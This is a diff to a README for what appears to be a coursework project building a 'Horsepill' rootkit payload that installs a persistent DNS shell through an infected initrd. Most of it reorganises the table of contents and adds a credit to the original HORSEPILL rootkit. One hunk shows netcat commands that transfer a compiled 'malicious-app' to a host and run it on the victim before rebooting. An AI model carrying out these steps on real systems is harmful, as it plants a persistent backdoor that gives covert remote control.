@@ -2,19 +2,18 @@
 _You are requested to produce a payload (using any vector of your choice) that is able to install a DNS shell (see, e.g., [here](https://github.com/sensepost/DNS-Shell)) using the horsepill attack. The payload should survive kernel updates._
 
 ## Table of contents
-- [Horsepill Payload](#horsepill-payload)
-  - [Table of contents](#table-of-contents)
-  - [Documentation](#documentation)
-  - [System characteristics](#system-characteristics)
-  - [Tunnel DNS](#tunnel-dns)
-  - [How to generate the infected `run-init`](#how-to-generate-the-infected-run-init)
-    - [Creating the patch file](#creating-the-patch-file)
-    - [Applying the patch](#applying-the-patch)
-  - [How to infect the victim](#how-to-infect-the-victim)
-    - [Unpack and edit `initrd`](#unpack-and-edit-initrd)
-    - [Repack of `initrd`](#repack-of-initrd)
-    - [Disk replacement](#disk-replacement)
-    - [Automated infection](#automated-infection)
+- [Documentation](#documentation)
+- [System characteristics](#system-characteristics)
+- [Tunnel DNS](#tunnel-dns)
+- [How to generate the infected `run-init`](#how-to-generate-the-infected-run-init)
+  - [Creating the patch file](#creating-the-patch-file)
+  - [Applying the patch](#applying-the-patch)
+- [How to infect the victim](#how-to-infect-the-victim)
+  - [Unpack and edit `initrd`](#unpack-and-edit-initrd)
+  - [Repack of `initrd`](#repack-of-initrd)
+  - [Disk replacement](#disk-replacement)
+  - [Automated infection](#automated-infection)
+- [Inspiration](#inspiration)
 
 ## Documentation
 The required report is present in the [`docs`](docs/) folder in `tex` and `pdf` formats.
@@ -220,8 +219,11 @@ nc -lvnp 9999 | base64 -d | tar xz
 gcc malicious-app.c -o malicious-app
 tar cz malicious-app | base64 | nc 192.168.1.151 9999
 ```
-After that, on the victim side we infect `initrd` and reboot:
+Finally run:
 ```
 ./malicious-app
 reboot
 ```
+
+## Inspiration
+The realization of this project is inspired by @r00tkillah rootkit - [HORSEPILL](https://github.com/r00tkillah/HORSEPILL)
